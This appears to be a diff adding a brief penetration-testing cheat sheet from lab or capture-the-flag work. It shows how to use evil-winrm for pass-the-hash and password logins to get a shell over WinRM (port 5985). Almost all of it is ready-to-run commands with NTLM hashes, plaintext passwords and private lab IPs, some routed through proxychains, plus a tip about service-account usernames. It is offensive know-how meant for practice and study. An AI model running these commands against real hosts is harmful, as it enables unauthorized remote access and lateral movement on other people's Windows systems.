@@ -1,1 +1,22 @@
+Pass-the-Hash Attacks Over WinRM (5985)
+evil-winrm
 
+Here is the syntax for a pass-the-hash attack using evil-winrm:
+
+evil-winrm -u administrator -H 5b38382017f8c0ac215895d5f9aacac4 -i 172.16.1.x
+
+└─$ proxychains evil-winrm -i 172.16.200.x -u 'mute' -p 'rabbit:)'                               
+└─$ proxychains evil-winrm -i 172.16.237.x -u 'Administrator' --hash 'f1014ac49bae005ee3ece5f47547d185'      
+
+
+Gaining a Foothold Through the WinRM Service Using Evil-Winrm
+Since we can access the machine through WinRM, we can use evil-winrm to get a very powerful shell on the victim.
+
+evil-winrm -i 192.168.194.x -u mute -p riviera
+
+
+With the user’s NTLM hash, we can perform a pass-the-hash attack using evil-winrm to get a foothold on the victim. 
+
+    DONT FORGET THE ‘$’ IN THE USERNAME!!!
+
+evil-winrm -i 192.168.224.x -u svc_apache$ -H 009E42B78BF6CEA5F5C067B32B99FCA6
